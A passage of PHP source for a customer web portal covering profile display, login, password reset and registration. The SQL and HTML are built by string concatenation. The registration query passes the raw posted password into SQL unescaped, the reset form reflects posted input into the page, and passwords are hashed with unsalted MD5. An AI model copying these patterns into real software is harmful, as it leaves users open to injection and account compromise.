$get_data .='<div style="cursor:pointer;" onclick=window.open("./outputs/demand_template_pdf.php?id='.base64_encode($row[0]).'"); onmouseout="document.getElementById(\'demand_line'.$temp_cycle.'a\').style.color=\'blue\';document.getElementById(\'demand_line'.$temp_cycle.'b\').style.color=\'blue\';" onmouseover="document.getElementById(\'demand_line'.$temp_cycle.'a\').style.color=\'red\';document.getElementById(\'demand_line'.$temp_cycle.'b\').style.color=\'red\';" >
<SPAN id=demand_line'.$temp_cycle.'a style="padding-left:5px;padding-right:5px;color:blue;font-weight:bold;font-size:16px;font-family: arial;width:170px;padding-top:4px;height:22px;border:0;text-align:center;" >'.$row[0].'</SPAN><span style="width:8px;height:25px;"> </span><SPAN id=demand_line'.$temp_cycle.'b style="padding-left:5px;padding-right:5px;color:blue;font-weight:bold;font-size:16px;font-family: arial;width:170px;padding-top:4px;height:22px;border:0;text-align:center;" >'.datecs($row[1]).'</SPAN>
</div>
';
$temp_cycle++;
}

$get_data .='</div></div>';    

echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="stylesheet" href="./modules/ckeditor/shadowbox/shadowbox.css" type="text/css" media="screen" /><script src="./modules/ckeditor/shadowbox/shadowbox.js" type="text/javascript"></script><script>Shadowbox.init();var fn_items = new Array();if (document.all){document.onkeydown = function (){if (27==event.keyCode){parent.close_tab();}}}</script></head><body onload=delayed_hidden_message("reg_message"); style="width:100%;height:100%;padding:0px;margin:8px;margin-bottom:0px;background-image:url(\'./images/body.png\');background-repeat:no-repeat;background-attachment:fixed;background-position:center;">'.$get_data.'</body><script src="./functions/js/data_list.js" type="text/javascript"></script></html>

';    
}








if (isset($_GET["customer_profile"]) && @$_SESSION[$sess_id.'logged_user'] ) { //user window
    require_once ("./config/mssql_dbconnect.php");
        @$sql = "SELECT * FROM dbo.[120_registration] WHERE login_name = '".mssecuresql($_SESSION[$sess_id.'logged_user'])."' ";
        //program_log(@$sql,"yes",'sql.log');
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
$get_data = '<div style="font-size: 18px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 10px; top: 10px;color:gray;">
	'.dictionary("customer_profile",$_SESSION["language"]).'</div>
<div style="font-size: 12px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 295px; top: 16px;">
	<span style="color:blue;cursor:pointer;" onmouseout="this.style.color=\'blue\'" onmouseover="this.style.color=\'red\'" onclick="parent.profile_edit();" >'.dictionary("profile_edit",$_SESSION["language"]).'</span> / <span style="color:blue;cursor:pointer;" onmouseout="this.style.color=\'blue\'" onmouseover="this.style.color=\'red\'" onclick="parent.demand_archive();" >'.dictionary("demand_archive",$_SESSION["language"]).'</span></div>
<div style="font-size: 18px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 10px; top: 40px;text-decoration: underline;">'.$row["full_name"].'</div>
<div style="position: absolute; left: 573px; top: 10px">
	<img alt="" src="./modules/userfiles/images/logo.png" style="height: 65px; width: 105px" /></div>
<div style="position: absolute; left: 10px; top: 80px">
<table style="border:0px;width:684px;" >
<tr><td colspan=2 style="text-align:left;" ><span style="color:black;font-weight:bold;font-size:12px;font-family: verdana;" >'.dictionary("customer_information",$_SESSION["language"]).':</span></td>
<td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: verdana;" ><span style="width:300px" >'.dictionary("delivery_address_list",$_SESSION["language"]).'</span></td>
</tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("surname",$_SESSION["language"]).",".dictionary("name",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:140px;" >'.$row["full_name"].'</span></td>
<td rowspan=3 colspan=2 style="text-align:right;vertical-align:top;color:black;font-weight:normal;font-size:12px;font-family: arial;width:300px;border:0;" ><div style="overflow-y:scroll;overflow-x:hidden;width:219px;align:right;vertical-align:top;color:black;font-weight:normal;font-size:12px;font-family: arial;padding-top:4px;height:80px;border:0;background:url(\'./images/yellow_219_80.png\') repeat left top;" >
';
//delivery list
@$sql1 = "SELECT * FROM [dbo].[120_delivery_address] WHERE registration_id = '".mssecuresql($row["id"])."'ORDER BY delivery_address_name ASC";
@$check1 = sqlsrv_query( $conn, $sql1 , $params, $options );
$cycle=1;
while( @$row1 = sqlsrv_fetch_array( @$check1, SQLSRV_FETCH_BOTH ) ) {
    $get_data.='<div onclick=parent.load_delivery_address_view("'.$row1["id"].'","'.$cycle.'"); unselectable="on" id=dev_addr_'.$cycle.' class="fast_window_out" onmouseout="className=\'fast_window_out\';" onmouseover="className=\'fast_window_in\';" >'.$row1["delivery_address_name"].'</div>';
    $cycle++;
}
$get_data.='</td><script>parent.delivery_adr_count = '.$cycle.';</script>
</tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("company",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:175px;" >'.$row["company"].'</span></td>
</tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("ic",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:175px;" >'.$row["ico"].'</span></td>
</tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("dic",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:175px;" >'.$row["dic"].'</span></td>
<td colspan=2 style="width:300px;text-align:right;" ><span id=reg_value15 name=reg_value15 style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" ></span></td>
</tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("street",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:175px;" >'.$row["street"].'</span></td>
<td colspan=2 style="width:300px;text-align:right;" ><span id=reg_value16 name=reg_value16 style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" ></span></td>
</tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("post_code",$_SESSION["language"])." / ".dictionary("city",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:175px;" >'.$row["post_code"]." ; ".$row["city"].'</span></td>
<td colspan=2 style="width:300px;text-align:right;" ><span id=reg_value17 name=reg_value17 style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" ></span></td>
</tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("country",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:175px;" >'.$row["country"].'</span></td>
<td colspan=2 style="width:300px;text-align:right;" ><span id=reg_value18 name=reg_value18 style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" ></span></td>
</tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("phone",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:175px;" >'.$row["phone"].'</span></td>
<td colspan=2 style="width:300px;text-align:right;" ><span id=reg_value19 name=reg_value19 style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" ></span></td>
</tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("email",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:175px;" >'.$row["email"].'</span></td>
<td colspan=2 style="width:300px;text-align:right;" >
<span id=reg_value20 name=reg_value20 style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" ></span></td>
</tr>


<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("shipping",$_SESSION["language"]).': </span>
</td><td style="align:left;height:22px;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:175px;" >'.dictionary(@$row["shipping"],$_SESSION["language"]).'</span></td>
<td colspan=2 style="width:300px;text-align:right;" >
<span id=reg_value21 name=reg_value21 style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" ></span>
</td>
</tr>


<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("payment_terms",$_SESSION["language"]).': </span></td><td style="align:left;" ><span style="padding-left:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:175px;" >'.dictionary($row["payment_terms"],$_SESSION["language"]).'</span></td>
<td colspan=2 style="width:300px;text-align:right;" >
<span id=reg_value22 name=reg_value22 style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" ></span>
</td>
</tr>



</table>
<span class="logout_out" onmouseout="className=\'logout_out\';" onmouseover="className=\'logout_in\';" onclick=parent.logout(); >'.dictionary("logout",$_SESSION["language"]).'</span>
</div>
';

if ($_GET["registration_status"]=="NEW_REG") {
    $get_data.='<div onclick=hidden_message(this.id); id=reg_message style="cursor:pointer;position: absolute; left: 125px; top: 445px; width:450px;height:60px;border:0px;text-align:center;padding:10;14;10;10px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/atypical.png) top left no-repeat;">
    '.dictionary("msg_registration_ok",$_SESSION["language"]).'</div>';
}


if ($_GET["registration_status"]=="EDIT_REG") {
    $get_data.='<div onclick=hidden_message(this.id); id=reg_message style="cursor:pointer;position: absolute; left: 125px; top: 445px; width:450px;height:60px;border:0px;text-align:center;padding:10;14;10;10px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/atypical.png) top left no-repeat;">
    '.dictionary("msg_registration_updated",$_SESSION["language"]).'</div>';
}
    
echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="stylesheet" href="./modules/ckeditor/shadowbox/shadowbox.css" type="text/css" media="screen" /><script src="./modules/ckeditor/shadowbox/shadowbox.js" type="text/javascript"></script><script>Shadowbox.init();if (document.all){document.onkeydown = function (){if (27==event.keyCode){parent.close_tab();}}}</script>
 <style>
  .fast_window_out{
  opacity: 0.3;
  filter: alpha(opacity=30);
  cursor:pointer;
  margin: 0px;
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:none;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
 .fast_window_in{
  opacity: 1;
  filter: alpha(opacity=100);
  cursor:pointer;
  margin: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:#76C1FB;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
  .logout_out{
  color:white;
  font-weight:bold;
  font-size:12px;
  font-family: verdana;
  left:10px;
  opacity: 0.3;
  filter: alpha(opacity=30);
  cursor:pointer;
  margin: 0px;
  margin-top:40px;  
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:79px;
  height:21px;
  text-align:center;
  padding-top:3px;
  background: url(./images/no.png) no-repeat left top;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
 .logout_in{
  color:white;
  font-weight:bold;
  font-size:12px;
  font-family: verdana;
  left:10px;
  opacity: 1;
  filter: alpha(opacity=100);
  cursor:pointer;
  margin: 0px;
  margin-top:40px;
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:79px;
  height:21px;
  text-align:center;
  padding-top:3px;
  background: url(./images/no.png) no-repeat left top;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}

 </style>
</head><body onload=delayed_hidden_message("reg_message"); style="width:100%;height:100%;padding:0px;margin:8px;margin-bottom:0px;background-image:url(\'./images/body.png\');background-repeat:no-repeat;background-attachment:fixed;background-position:center;">'.$get_data.'</body><script src="./functions/js/data_list.js" type="text/javascript"></script></html><script>function delayed_hidden_message(value){setTimeout(function(){document.getElementById(value).style.display="none";}, 5000);}function hidden_message(value){document.getElementById(value).style.display="none";}</script>
</script>
    ';
}



if (isset($_GET["forgotten_password"]) && !@$_SESSION[$sess_id.'logged_user'] && @$_POST["check"]=="RESTORE" ){ //check login
    require_once ("./config/mssql_dbconnect.php");
    require_once ("./modules/captcha/securimage_admin.php");
  $img = new Securimage();
  $valid = $img->check(@$_POST["reg_value1"]);
  if($valid == true) {
        @$sql = "SELECT id FROM dbo.[120_registration] WHERE email = '".mssecuresql(@$_POST["reg_value9"])."' ";
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
  }
  if ($row[0]=="" or $valid == false) {
    $_POST["check"] = "BAD";
  }
    else {
        $new_password=generate_password();
        $new_pass_sql = "UPDATE dbo.[120_registration] SET login_password = HashBytes('MD5','".$new_password."') WHERE id = '".mssecuresql($row[0])."' ";
        $sql_ins_res = sqlsrv_query( $conn, $new_pass_sql , $params, $options ) or die (dictionary("sql_command",$_SESSION["language"])." > ".print_r( sqlsrv_errors(), true));
        mail_restore_password(@$_POST["reg_value9"],@$new_password);
        unset($_GET["forgotten_password"]);
        unset($_POST["check"]);
        $_GET["login"] = "YES";$info_message = "RESTORED";
    }        
}




if (isset($_GET["login"]) && !(isset($_POST["check"]))){ //login form


    if (@$_SESSION[$sess_id.'logged_user']){echo '<script>parent.customer_profile();</script>';} else {
    
$get_data = '<form id="login_form" method="POST" >
<div style="font-size: 18px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 10px; top: 10px">
	'.dictionary("system_access",$_SESSION["language"]).'</div>
<div style="font-size: 12px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 295px; top: 16px">
	<span style="color:blue;cursor:pointer;" onmouseout="this.style.color=\'blue\'" onmouseover="this.style.color=\'red\'" onclick="document.getElementById(\'siimage\').src =\'./modules/captcha/securimage_show.php?sid=\'+Math.random();parent.new_registration();" >'.dictionary("new_registration",$_SESSION["language"]).'</span> / <span style="color:blue;cursor:pointer;" onmouseout="this.style.color=\'blue\'" onmouseover="this.style.color=\'red\'" onclick="document.getElementById(\'siimage\').src =\'./modules/captcha/securimage_show.php?sid=\'+Math.random();parent.forgotten_password();" >'.dictionary("forgotten_password",$_SESSION["language"]).'</span></div>
<div style="font-size: 18px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 10px; top: 40px">
	<input id=value1 name=value1 onclick="select()" style="border-left-width: 0px; cursor: pointer; font-size: 12px; height: 25px; font-family: arial,geneva,sans-serif; border-right-width: 0px; background: url(./images/search_field.png) no-repeat left top; border-bottom-width: 0px; color: white; text-align: center; padding-top: 5px; border-top-width: 0px; width: 169px" type="text" value="'.dictionary("client_login",$_SESSION["language"]).'" /><span style="width: 10px"> </span><input id=value2 onclick=this.select(); name=value2 style="border-left-width: 0px; cursor: pointer; font-size: 12px; height: 25px; font-family: arial,geneva,sans-serif; border-right-width: 0px; background: url(./images/search_field.png) no-repeat left top; border-bottom-width: 0px; color: white; text-align: center; padding-top: 5px; border-top-width: 0px; width: 169px" type="text" value="'.dictionary("password",$_SESSION["language"]).'" /></div>
<div style="position: absolute; left: 573px; top: 10px">
	<img alt="" src="./modules/userfiles/images/logo.png" style="height: 65px; width: 105px" /></div>



<div style="position: absolute; left: 10px; top: 105px; ">
<input id=value3 name=value3 onclick="select();" style="border-left-width: 0px; cursor: pointer; font-size: 12px; height: 24px; font-family: arial,geneva,sans-serif; border-right-width: 0px; background: url(./images/input_140_22.png) no-repeat left top; border-bottom-width: 0px; color: black; text-align: center; padding-top: 5px; border-top-width: 0px; width: 140px" type="text" value="'.dictionary("rewrite_code",$_SESSION["language"]).'" /><img src="./images/captcha_reload.png" width="24" height="24" onclick=\'document.getElementById("siimage").src ="./modules/captcha/securimage_show.php?sid="+Math.random();\'  style=cursor:pointer;vertical-align:top;margin-left:5px;margin-top:1px; />
</div>

<div style="position: absolute; left: 10px; top: 145px">
<span onclick=parent.check_login_form(); style="cursor:pointer;color:white;font-weight:bold;font-size:12px;font-family: verdana;text-align:center;width:150px;height:22px;background: url(./images/add_item_button.png);padding-top:3px;"  onmouseout="this.style.color=\'white\'" onmouseover="this.style.color=\'#F2DE41\'" >'.dictionary("login",$_SESSION["language"]).'</span>
</div>
<input type=hidden name=check value="CHECK" >
<div style="position: absolute; left: 20px; top: 75px">
	<img align="left" border="0" id="siimage" src="./modules/captcha/securimage_show.php?sid=" style="vertical-align: top; padding-right: 0px;cursor:pointer;" /></div>
</form>

<div onclick=hidden_window_status(this.id); id=window_status style="display:none;cursor:pointer;position: absolute; left: 125px; top: 445px; width:450px;height:60px;border:0px;text-align:center;padding:10;14;10;10px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/atypical.png) top left no-repeat;" >
<strong>'.dictionary("badlogon",$_SESSION["language"]).'</strong></div>
';

$get_data.='';
    echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="stylesheet" href="./modules/ckeditor/shadowbox/shadowbox.css" type="text/css" media="screen" /><script src="./modules/ckeditor/shadowbox/shadowbox.js" type="text/javascript"></script><script>Shadowbox.init();var fn_items = new Array();if (document.all){document.onkeydown = function (){if (27==event.keyCode){parent.close_tab();}}}</script></head><body onload=delayed_hidden_message("reg_message"); style="width:100%;height:100%;padding:0px;margin:8px;margin-bottom:0px;background-image:url(\'./images/body.png\');background-repeat:no-repeat;background-attachment:fixed;background-position:center;">'.$get_data.'</body><script src="./functions/js/data_list.js" type="text/javascript"></script></html>
    <script>function delayed_hidden_window_status(value){setTimeout(function(){document.getElementById(value).style.display="none";}, 5000);}function hidden_window_status(value){document.getElementById(value).style.display="none";}document.getElementById("siimage").src ="./modules/captcha/securimage_show.php?sid="+Math.random();</script>';
if (@$info_message=="RESTORED"){echo'<script>document.getElementById("window_status").innerHTML="<strong>'.dictionary("your_request_was_sent",$_SESSION["language"]).'</strong>";document.getElementById("window_status").style.display="inline";setTimeout(function(){document.getElementById("window_status").style.display="none";}, 5000);</script>';}
echo '';
}    
}



if (isset($_GET["forgotten_password"]) && !@$_SESSION[$sess_id.'logged_user']){ //forgotten password

$get_data = '<form id="forgotten_password" method="POST" >
<div style="font-size: 18px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 10px; top: 10px">
	'.dictionary("forgotten_password",$_SESSION["language"]).'</div>
<div style="font-size: 12px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 295px; top: 16px">
	<span style="color:blue;cursor:pointer;" onmouseout="this.style.color=\'blue\'" onmouseover="this.style.color=\'red\'" onclick="document.getElementById(\'siimage\').src =\'./modules/captcha/securimage_show.php?sid=\'+Math.random();parent.new_registration();" >'.dictionary("new_registration",$_SESSION["language"]).'</span> / <span style="color:blue;cursor:pointer;" onmouseout="this.style.color=\'blue\'" onmouseover="this.style.color=\'red\'" onclick="document.getElementById(\'siimage\').src =\'./modules/captcha/securimage_show.php?sid=\'+Math.random();parent.login();" >'.dictionary("system_access",$_SESSION["language"]).'</span></div>
<div style="position: absolute; left: 573px; top: 10px">
	<img alt="" src="./modules/userfiles/images/logo.png" style="height: 65px; width: 105px" /></div>
    
<div style="position: absolute; left: 10px; top: 35px">
<span style="width:80px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("your_email",$_SESSION["language"]).': </span>
<span><input id=reg_value9 name=reg_value9 type=text value="'.$_POST["reg_value9"].'" style="padding-left:5px;padding-right:5px;color:white;font-weight:normal;font-size:12px;font-family: arial;width:187px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_email.png\') no repeat top left;" onkeyup="parent.check_email(\'existed\');" ></span><span id=email_check status=BAD style="width:32px;vertical-align:middle;"></span>
</div>

<div style="position: absolute; left: 20px; top: 75px">
	<img align="left" border="0" id="siimage" src="./modules/captcha/securimage_show.php?sid=" style="vertical-align: top; padding-right: 0px;cursor:pointer;" /></div>

<div style="position: absolute; left: 10px; top: 105px; ">
<input id=reg_value1 name=reg_value1 onclick="select();" style="border-left-width: 0px; cursor: pointer; font-size: 12px; height: 24px; font-family: arial,geneva,sans-serif; border-right-width: 0px; background: url(./images/input_140_22.png) no-repeat left top; border-bottom-width: 0px; color: black; text-align: center; padding-top: 5px; border-top-width: 0px; width: 140px" type="text" value="'.dictionary("rewrite_code",$_SESSION["language"]).'" /><img src="./images/captcha_reload.png" width="24" height="24" onclick=\'document.getElementById("siimage").src ="./modules/captcha/securimage_show.php?sid="+Math.random();\'  style=cursor:pointer;vertical-align:top;margin-left:5px;margin-top:1px; /></div>
 
<div style="position: absolute; left: 10px; top: 145px">
<span onclick=parent.restore_password(); style="cursor:pointer;color:white;font-weight:bold;font-size:12px;font-family: verdana;text-align:center;width:150px;height:22px;background: url(./images/add_item_button.png);padding-top:3px;" onmouseout="this.style.color=\'white\'" onmouseover="this.style.color=\'#F2DE41\'" >'.dictionary("restore_password",$_SESSION["language"]).'</span>
</div>
</div>

<input type=hidden name=check value="RESTORE" >
</form>


<div onclick=hidden_window_status(this.id); id=window_status style="';
$get_data.='display:none;cursor:pointer;position: absolute; left: 125px; top: 445px; width:450px;height:60px;border:0px;text-align:center;padding:10;14;10;10px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/atypical.png) top left no-repeat;" >
<strong>'.dictionary("bad_request",$_SESSION["language"]).'</strong></div>
'; 

    echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="stylesheet" href="./modules/ckeditor/shadowbox/shadowbox.css" type="text/css" media="screen" /><script src="./modules/ckeditor/shadowbox/shadowbox.js" type="text/javascript"></script><script>Shadowbox.init();var fn_items = new Array();if (document.all){document.onkeydown = function (){if (27==event.keyCode){parent.close_tab();}}}</script></head><body style="width:100%;height:100%;padding:0px;margin:8px;margin-bottom:0px;background-image:url(\'./images/body.png\');background-repeat:no-repeat;background-attachment:fixed;background-position:center;">'.$get_data.'</body></script>
<script src="./functions/js/data_list.js" type="text/javascript"></script></html>
<script>function delayed_hidden_window_status(value){setTimeout(function(){document.getElementById(value).style.display="none";}, 5000);}function hidden_window_status(value){document.getElementById(value).style.display="none";}
';
if (@$_POST["check"]=="BAD"){echo '<script language="JavaScript">document.getElementById("siimage").src ="./modules/captcha/securimage_show.php?sid="+Math.random();document.getElementById("window_status").style.display="inline";delayed_hidden_window_status("window_status");parent.check_email("existed");</script>';}
}









if (isset($_GET["new_registration"]) && @$_POST["check"]=="NEW_REG" && @!$_SESSION[$sess_id.'logged_user'] ){ //check login
    require_once ("./config/mssql_dbconnect.php");
    require_once ("./modules/captcha/securimage_admin.php");
  $img = new Securimage();
  $valid = $img->check(@$_POST["value3"]);
  if($valid == true) {
        $new_reg_sql = "INSERT INTO dbo.[120_registration] ([login_name],[login_password],[full_name],[ico],[company],[street],[city],[post_code],[dic],[phone],[email],[create_date],[create_ip],[country])VALUES('".mssecuresql(@$_POST["value1"])."',HashBytes('MD5','".@$_POST["value2"]."'),'".mssecuresql(@$_POST["reg_value1"])."','".mssecuresql(@$_POST["reg_value2"])."','".mssecuresql(@$_POST["reg_value3"])."','".mssecuresql(@$_POST["reg_value4"])."','".mssecuresql(@$_POST["reg_value5"])."','".mssecuresql(@$_POST["reg_value6"])."','".mssecuresql(@$_POST["reg_value7"])."','".mssecuresql(@$_POST["reg_value8"])."','".mssecuresql(@$_POST["reg_value9"])."',GETDATE(),'".getIpAddress()."','".mssecuresql(@$_POST["reg_value10"])."') ";
        $sql_ins_reg = sqlsrv_query( $conn, $new_reg_sql , $params, $options ) or die (dictionary("sql_command",$_SESSION["language"])." > ".print_r( sqlsrv_errors(), true));
        customer_profile_mail(@$_POST["reg_value9"],@$_POST["value2"],dictionary("new_registration",$_SESSION["language"]));
    $_SESSION[$sess_id.'logged_user']=@$_POST["value1"];
    ?><script language="JavaScript">parent.customer_profile("NEW_REG");</script><?    

    }
    else {//znovu nacita reg form / form data se neprenasi data jsou v postu
        message(dictionary("wrong_copy_code",$_SESSION["language"]));
       ?><script language="JavaScript">window.location.assign('<?echo "http://".$_SERVER["HTTP_HOST"].$_SERVER["PHP_SELF"]."?".$_SERVER['QUERY_STRING'];?>');</script><?
    }        
}




if (isset($_GET["country_info"])){
     $check_country = simplexml_load_file("http://freegeoip.net/xml/".getIpAddress());
     $test = "CountryName";$test = @$check_country -> $test;
     if ($test <> "Reserved"){
        echo "var frame1_target = document.getElementById('program_body');
        frame1_target.contentWindow.document.getElementById('reg_value10').options[frame1_target.contentWindow.document.getElementById('reg_value10').selectedIndex].innerHTML = '".$test."';
        "; 
     }
}





if (isset($_GET["new_registration"]) && @!$_SESSION[$sess_id.'logged_user']){ //new registration form
require_once ("./config/mssql_dbconnect.php");

$get_data = '<form id="new_registration" method="POST" >
<div style="font-size: 18px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 10px; top: 10px">
	'.dictionary("new_registration",$_SESSION["language"]).'</div>
<div style="font-size: 12px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 295px; top: 16px">
		<span style="color:blue;cursor:pointer;" onmouseout="this.style.color=\'blue\'" onmouseover="this.style.color=\'red\'" onclick="document.getElementById(\'siimage\').src =\'./modules/captcha/securimage_show.php?sid=\'+Math.random();parent.login();" >'.dictionary("system_access",$_SESSION["language"]).'</span> / <span style="color:blue;cursor:pointer;" onmouseout="this.style.color=\'blue\'" onmouseover="this.style.color=\'red\'" onclick="document.getElementById(\'siimage\').src =\'./modules/captcha/securimage_show.php?sid=\'+Math.random();parent.forgotten_password();" >'.dictionary("forgotten_password",$_SESSION["language"]).'</span></div>
<div style="font-size: 18px; font-family: verdana,geneva,sans-serif; position: absolute; font-weight: bold; left: 10px; top: 40px">
	<input id=value1 name=value1 onclick="select();" onkeyup="parent.check_username();" style="border-left-width: 0px; cursor: pointer; font-size: 12px; height: 25px; font-family: arial,geneva,sans-serif; border-right-width: 0px; background: url(./images/search_field.png) no-repeat left top; border-bottom-width: 0px; color: white; text-align: center; padding-top: 5px; border-top-width: 0px; width: 169px" type="text" value="'.dictionary("client_login",$_SESSION["language"]).'" /><span style="width: 10px"> </span><input id=value2 name=value2 onclick="select();" style="border-left-width: 0px; cursor: pointer; font-size: 12px; height: 25px; font-family: arial,geneva,sans-serif; border-right-width: 0px; background: url(./images/search_field.png) no-repeat left top; border-bottom-width: 0px; color: white; text-align: center; padding-top: 5px; border-top-width: 0px; width: 169px" type="text" value="'.dictionary("password",$_SESSION["language"]).'" onkeyup="passwordStrength(this.value,document.getElementById(\'strendth\'))" />
    <div style="width: 348px;height:5px;font-size:3px;"><span style="width: 179px"> </span><span id="strendth" style=height:5px;font-size:3px;lenght:169px;cursor:pointer; ></span></div></div>
<div id=user_check style="position: absolute; font-weight: bold; left: 12px; top: 44px"></div>
    
<div style="position: absolute; left: 573px; top: 10px">
	<img alt="" src="./modules/userfiles/images/logo.png" style="height: 65px; width: 105px" /></div>

<div style="position: absolute; left: 10px; top: 105px; ">
<input id=value3 name=value3 onclick="select();" style="border-left-width: 0px; cursor: pointer; font-size: 12px; height: 24px; font-family: arial,geneva,sans-serif; border-right-width: 0px; background: url(./images/input_140_22.png) no-repeat left top; border-bottom-width: 0px; color: black; text-align: center; padding-top: 5px; border-top-width: 0px; width: 140px" type="text" value="'.dictionary("rewrite_code",$_SESSION["language"]).'" /><img src="./images/captcha_reload.png" width="24" height="24" onclick=\'document.getElementById("siimage").src ="./modules/captcha/securimage_show.php?sid="+Math.random();\'  style=cursor:pointer;vertical-align:top;margin-left:5px;margin-top:1px; /></div>

<div style="position: absolute; left: 20px; top: 75px">
	<img align="left" border="0" id="siimage" src="./modules/captcha/securimage_show.php?sid=" style="vertical-align: top; padding-right: 0px;cursor:pointer;" /></div>

<div style="position: absolute; left: 10px; top: 150px">
<table style="border:0px;width:349px;" >
<tr><td colspan=2 style="text-align:left;" >
<span style="color:black;font-weight:bold;font-size:12px;font-family: verdana;" >'.dictionary("customer_identification",$_SESSION["language"]).'</span>
<span style="color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("required_fields",$_SESSION["language"]).'</span>
</td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("surname",$_SESSION["language"]).",".dictionary("name",$_SESSION["language"]).': </span>
